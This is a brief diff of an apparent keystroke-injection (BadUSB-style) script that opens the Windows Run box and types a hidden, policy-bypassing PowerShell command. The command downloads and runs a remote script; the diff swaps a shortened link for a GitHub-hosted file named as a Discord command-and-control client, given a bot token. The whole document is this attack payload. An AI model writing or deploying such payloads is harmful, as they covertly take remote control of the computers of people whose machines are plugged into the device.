@@ -12,5 +12,5 @@ layout("us")
 delay(1000);
 press("GUI r");
 delay(1000);
-type("powershell -NoP -Ep Bypass -W H -C $tk = 'BOT_TOKEN'; irm https://is.gd/bwdcc2 | iex");
+type("powershell -NoP -Ep Bypass -W H -C $tk = 'BOT_TOKEN'; irm https://raw.githubusercontent.com/brikodepo/PoshCord-C2/refs/heads/main/PoshCord-C2-main/Discord-C2-Client.ps1 | iex");
 press("ENTER");
